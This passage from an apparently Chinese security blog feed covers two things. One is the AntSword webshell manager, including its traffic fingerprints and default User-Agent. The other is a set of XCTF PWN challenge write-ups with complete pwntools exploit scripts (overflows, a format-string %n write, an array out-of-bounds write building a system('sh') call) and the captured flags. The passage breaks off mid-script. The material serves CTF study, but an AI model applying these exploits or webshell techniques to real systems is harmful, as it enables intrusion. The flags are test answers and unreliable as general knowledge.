    <content type="html"><![CDATA[<h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><p>文档地址：</p><p><a href="https://doc.u0u.us/zh-hans/getting_started/get_antsword.html">https://doc.u0u.us/zh-hans/getting_started/get_antsword.html</a></p><p>下载地址：</p><p><a href="https://github.com/AntSwordProject/AntSword-Loader/releases">https://github.com/AntSwordProject/AntSword-Loader/releases</a></p><span id="more"></span><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><p>连接webshell</p><p><img src="https://i.loli.net/2021/02/10/yAOQGmlHo8dR9Cn.png" alt="webshell连接"></p><p>连接成功的界面:</p><p><img src="https://i.loli.net/2021/02/10/5RBCG1aSKvb8dsI.png" alt="image.png"></p><p>功能就是上图中的功能，跟中国菜刀类似。</p><h3 id="流量内容"><a href="#流量内容" class="headerlink" title="流量内容"></a>流量内容</h3><p><img src="https://i.loli.net/2021/02/10/ue67Q4HUSRPEk3F.png" alt="列出文件的相关流量"></p><p>在中国蚁剑中使用虚拟终端运行命令的数据包:</p><p><img src="https://i.loli.net/2021/02/10/zFp3fG4KEw2JXsn.png" alt="在中国蚁剑中使用虚拟终端运行命令的数据包"></p><p>可以看到蚁剑在Windows上通过调用COM打开WScript.shell进行命令执行的操作，每次执行命令都会发送此类数据包，且返回包如果不修改时会有[S]、[E]的符号，如果目标环境的流量审计环境中有此类规则的话触发检测的概率应该还是比较大的。</p><p>蚁剑的默认UA为:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">User</span>-Agent: antSword/v2.<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>未完待续。。。</p>]]></content>
    
    
    <categories>
      
      <category>黑客工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>蚁剑</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界PWN高手进阶区</title>
    <link href="/2019/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6%E5%8C%BA/"/>
    <url>/2019/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6%E5%8C%BA/</url>
    
    <content type="html"><![CDATA[<h3 id="dice-game"><a href="#dice-game" class="headerlink" title="dice_game"></a>dice_game</h3><p>溢出＋随机数</p><span id="more"></span><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> re<br><br>context.log_level = <span class="hljs-string">&#x27;Debug&#x27;</span><br><br>libc = cdll.LoadLibrary(<span class="hljs-string">&quot;libc.so.6&quot;</span>)<br><br><span class="hljs-comment">#io = process(&#x27;./dice_game&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>, <span class="hljs-string">&#x27;43224&#x27;</span>)<br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x40</span> + p64(<span class="hljs-number">1</span>)<br>io.sendlineafter(<span class="hljs-string">&quot;Welcome, let me know your name: &quot;</span>, payload)<br><br>libc.srand(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>randnum = (libc.rand()) % <span class="hljs-number">6</span> + <span class="hljs-number">1</span><br>io.sendlineafter(<span class="hljs-string">&quot;point(1~6): &quot;</span>, <span class="hljs-built_in">str</span>(randnum))<br><br>io.recvline()<br>io.recvline()<br>flag = io.recvline()<br><span class="hljs-built_in">print</span> flag<br></code></pre></td></tr></table></figure><p><strong>flag</strong></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">cyberpeace&#123;d852e3567fa642894b4bad<span class="hljs-number">82042d53a5</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="forget"><a href="#forget" class="headerlink" title="forget"></a>forget</h3><p>溢出，将v3修改为getflag的函数的地址，使用\x47作为padding即可使得v14为1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;Debug&#x27;</span><br><br><span class="hljs-comment">#io = process(&#x27;./forget&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>, <span class="hljs-string">&#x27;32456&#x27;</span>)<br><br>payload = <span class="hljs-string">&#x27;\x47&#x27;</span> * <span class="hljs-number">32</span> + p32(<span class="hljs-number">0x080486CC</span>)<br><br>io.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-string">&#x27;hvnt3r&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">&#x27;Enter the string to be validate\n&gt;&#x27;</span>, payload)<br><br>io.recvline()<br><br></code></pre></td></tr></table></figure><p><strong>flag</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cyberpeace</span>&#123;<span class="hljs-number">36</span>db2d4142ff5529b834e236e2e3c641&#125;<br></code></pre></td></tr></table></figure><h3 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h3><p>数组未检查范围导致溢出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;which number to change:&quot;</span>);<br>      __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v5);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;new number:&quot;</span>);<br>      __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v7);<br>      v13[v5] = v7;<br></code></pre></td></tr></table></figure><p>下断点确认v13起始地址与ebp的距离为0x84，构造sh的system函数栈帧。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><br><span class="hljs-attribute">context</span>.log_level = &#x27;Debug&#x27;<br><br><span class="hljs-attribute">io</span> = process(&#x27;./<span class="hljs-number">6</span>abe739ff2af4a7fa6b3c89904389817&#x27;)<br><span class="hljs-attribute">io</span> = remote(&#x27;<span class="hljs-number">111.198.29.45</span>&#x27;, &#x27;<span class="hljs-number">48396</span>&#x27;)<br><br><span class="hljs-attribute">io</span>.sendlineafter(&#x27;How many numbers you have:\n&#x27;, &#x27;<span class="hljs-number">1</span>&#x27;)<br><span class="hljs-attribute">io</span>.sendlineafter(&#x27;Give me your numbers\n&#x27;, &#x27;<span class="hljs-number">1</span>&#x27;)<br><br><span class="hljs-attribute">def</span> write_addr(offset, byte):<br><span class="hljs-attribute">io</span>.sendlineafter(&#x27;<span class="hljs-number">5</span>. exit\n&#x27;, &#x27;<span class="hljs-number">3</span>&#x27;)<br><span class="hljs-attribute">io</span>.sendlineafter(&#x27;which number to change:\n&#x27;, str(offset))<br><span class="hljs-attribute">io</span>.sendlineafter(&#x27;new number:\n&#x27;, str(byte))<br><br><span class="hljs-comment">#08048450   sys_plt</span><br><span class="hljs-attribute">write_addr</span>(<span class="hljs-number">0</span>x84, <span class="hljs-number">0</span>x50)<br><span class="hljs-attribute">write_addr</span>(<span class="hljs-number">0</span>x85, <span class="hljs-number">0</span>x84)<br><span class="hljs-attribute">write_addr</span>(<span class="hljs-number">0</span>x86, <span class="hljs-number">0</span>x04)<br><span class="hljs-attribute">write_addr</span>(<span class="hljs-number">0</span>x87, <span class="hljs-number">0</span>x08)<br><br><span class="hljs-comment">#08048987   string_sh</span><br><span class="hljs-attribute">write_addr</span>(<span class="hljs-number">0</span>x84 + <span class="hljs-number">8</span>, <span class="hljs-number">0</span>x87)<br><span class="hljs-attribute">write_addr</span>(<span class="hljs-number">0</span>x85 + <span class="hljs-number">8</span>, <span class="hljs-number">0</span>x89)<br><span class="hljs-attribute">write_addr</span>(<span class="hljs-number">0</span>x86 + <span class="hljs-number">8</span>, <span class="hljs-number">0</span>x04)<br><span class="hljs-attribute">write_addr</span>(<span class="hljs-number">0</span>x87 + <span class="hljs-number">8</span>, <span class="hljs-number">0</span>x08)<br><br><span class="hljs-attribute">io</span>.sendlineafter(&#x27;<span class="hljs-number">5</span>. exit\n&#x27;, &#x27;<span class="hljs-number">5</span>&#x27;)<br><br><span class="hljs-attribute">io</span>.interactive()<br></code></pre></td></tr></table></figure><p><strong>flag</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cyberpeace</span>&#123;<span class="hljs-number">4331</span>b59d20df98308bc8ad86307b27a4&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>二进制安全</tag>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界PWN新手练习区题目</title>
    <link href="/2019/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA%E9%A2%98%E7%9B%AE/"/>
    <url>/2019/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA%E9%A2%98%E7%9B%AE/</url>
    
    <content type="html"><![CDATA[<h3 id="get-shell"><a href="#get-shell" class="headerlink" title="get_shell"></a>get_shell</h3><p>直接nc连接cat flag即可：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">cyberpeace&#123;d1070f116850587b8304cd1aa<span class="hljs-number">55565e6</span>&#125;<br></code></pre></td></tr></table></figure><span id="more"></span><h3 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h3><p>格式化字符串漏洞，<a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html">漏洞讲解</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> buf; <span class="hljs-comment">// [esp+1Eh] [ebp-7Eh]</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+22h] [ebp-7Ah]</span><br>  __int16 v6; <span class="hljs-comment">// [esp+26h] [ebp-76h]</span><br>  <span class="hljs-type">char</span> s; <span class="hljs-comment">// [esp+28h] [ebp-74h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v8; <span class="hljs-comment">// [esp+8Ch] [ebp-10h]</span><br><br>  v8 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);<br>  setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0</span>);<br>  buf = <span class="hljs-number">0</span>;<br>  v5 = <span class="hljs-number">0</span>;<br>  v6 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0x64</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;please tell me your name:&quot;</span>);<br>  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0xA</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;leave your message please:&quot;</span>);<br>  fgets(&amp;s, <span class="hljs-number">100</span>, <span class="hljs-built_in">stdin</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello %s&quot;</span>, &amp;buf);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;your message is:&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(&amp;s);<br>  <span class="hljs-keyword">if</span> ( pwnme == <span class="hljs-number">8</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;you pwned me, here is your flag:\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;cat flag&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Thank you!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用%x定位位置</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs llvm"> ⚡ root<span class="hljs-title">@kali</span> ~ nc <span class="hljs-number">111.198</span>.<span class="hljs-number">29.45</span> <span class="hljs-number">59649</span><br>please tell me your name:<br>hvnt<span class="hljs-number">3</span>r<br>leave your message please:<br>aaaa<span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><br>hello hvnt<span class="hljs-number">3</span>r<br>your message is:<br>aaaaffba<span class="hljs-number">298</span>e.f<span class="hljs-number">77</span><span class="hljs-keyword">c</span><span class="hljs-number">55</span>a<span class="hljs-number">0</span>.f<span class="hljs-number">0</span>b<span class="hljs-number">5</span>ff.ffba<span class="hljs-number">29</span>be.<span class="hljs-number">1</span>.<span class="hljs-keyword">c</span><span class="hljs-number">2.766848</span>fb.<span class="hljs-number">7233746</span>e.a.<span class="hljs-number">61616161.252e7825.78252</span>e<span class="hljs-number">78.2e78252</span>e.<span class="hljs-number">252e7825.78252</span>e<span class="hljs-number">78.2e78252</span>e.<br>Thank you!<br></code></pre></td></tr></table></figure><p>定位到printf第一个参数位置位于10，构造脚本，使用%n进行数据写入，需要将pwnme修改为8，因此%n之前有8个字节，使用%10$n定位到第十个偏移量。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br>p = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>, <span class="hljs-number">59649</span>)<br>pwnme = <span class="hljs-number">0x0804A068</span><br> <br>payload1 = <span class="hljs-string">&#x27;qwer&#x27;</span><br>payload2 = p32(pwnme) + <span class="hljs-string">&#x27;aaaa%10$n&#x27;</span><br> <br>p.recvuntil(<span class="hljs-string">&#x27;please tell me your name:\n&#x27;</span>)<br>p.sendline(payload1)<br>p.recvuntil(<span class="hljs-string">&#x27;leave your message please:\n&#x27;</span>)<br>p.sendline(payload2)<br><span class="hljs-built_in">print</span>(p.recv())<br><span class="hljs-built_in">print</span>(p.recv())<br></code></pre></td></tr></table></figure><p>flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cyberpeace</span>&#123;<span class="hljs-number">7</span>a11a088e83dfd9525a7f575eb43bbe4&#125;<br></code></pre></td></tr></table></figure><h3 id="when-did-you-born"><a href="#when-did-you-born" class="headerlink" title="when_did_you_born"></a>when_did_you_born</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">char</span> v4; <span class="hljs-comment">// [rsp+0h] [rbp-20h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v6 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>);<br>  setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What&#x27;s Your Birth?&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v5);<br>  <span class="hljs-keyword">while</span> ( getchar() != <span class="hljs-number">10</span> )<br>    ;<br>  <span class="hljs-keyword">if</span> ( v5 == <span class="hljs-number">1926</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You Cannot Born In 1926!&quot;</span>);<br>    result = <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What&#x27;s Your Name?&quot;</span>);<br>    gets(&amp;v4);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You Are Born In %d\n&quot;</span>, v5);<br>    <span class="hljs-keyword">if</span> ( v5 == <span class="hljs-number">1926</span> )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You Shall Have Flag.&quot;</span>);<br>      system(<span class="hljs-string">&quot;cat flag&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You Are Naive.&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You Speed One Second Here.&quot;</span>);<br>    &#125;<br>    result = <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>溢出，脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br>io = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>, <span class="hljs-number">34190</span>)<br>age = p64(<span class="hljs-number">1926</span>)<br> <br>io.recvuntil(<span class="hljs-string">&#x27;What\&#x27;s Your Birth?\n&#x27;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>io.recvuntil(<span class="hljs-string">&#x27;What\&#x27;s Your Name?\n&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">8</span> + age)<br><span class="hljs-built_in">print</span>(io.recv())<br></code></pre></td></tr></table></figure><p>flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cyberpeace</span>&#123;<span class="hljs-number">480</span>d5559a5da195d0d304031d1ca79ad&#125;<br></code></pre></td></tr></table></figure><h3 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  alarm(<span class="hljs-number">0x3C</span>u);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;~~ welcome to ctf ~~     &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;lets get helloworld for bof&quot;</span>);<br>  read(<span class="hljs-number">0</span>, &amp;unk_601068, <span class="hljs-number">0x10</span>uLL);<br>  <span class="hljs-keyword">if</span> ( dword_60106C == <span class="hljs-string">&#x27;nuaa&#x27;</span> )<br>    sub_400686(<span class="hljs-number">0LL</span>, &amp;unk_601068);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>溢出，脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br>io = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>, <span class="hljs-number">41373</span>)<br><br>nuaa = p32(<span class="hljs-number">0x6E756161</span>)<br> <br>io.recvuntil(<span class="hljs-string">&#x27;lets get helloworld for bof\n&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">4</span> + nuaa)<br><span class="hljs-built_in">print</span>(io.recv())<br></code></pre></td></tr></table></figure><p>flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cyberpeace</span>&#123;<span class="hljs-number">907</span>d57b451589b80d32b742492ffc357&#125;<br></code></pre></td></tr></table></figure><h3 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">vulnerable_function</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf; <span class="hljs-comment">// [rsp+0h] [rbp-80h]</span><br><br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">512uLL</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br>io = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>, <span class="hljs-number">39085</span>)<br><br>eip = p64(<span class="hljs-number">0x400596</span>)<br>payload = <span class="hljs-string">&#x27;A&#x27;</span> * (<span class="hljs-number">128</span> + <span class="hljs-number">8</span>) + eip<br> <br>io.recvuntil(<span class="hljs-string">&#x27;World\n&#x27;</span>)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><p>flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cyberpeace</span>&#123;<span class="hljs-number">0</span>a5428dc9d0fc7b09735439513d590f0&#125;<br></code></pre></td></tr></table></figure><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>ROP利用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">vulnerable_function</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf; <span class="hljs-comment">// [esp+0h] [ebp-88h]</span><br><br>  system(<span class="hljs-string">&quot;echo Input:&quot;</span>);<br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x100</span>u);<br>&#125;<br></code></pre></td></tr></table></figure><p>题目中system与bin&#x2F;sh都已经准备好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br>io = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>, <span class="hljs-number">57085</span>)<br><br>bin_sh = p32(<span 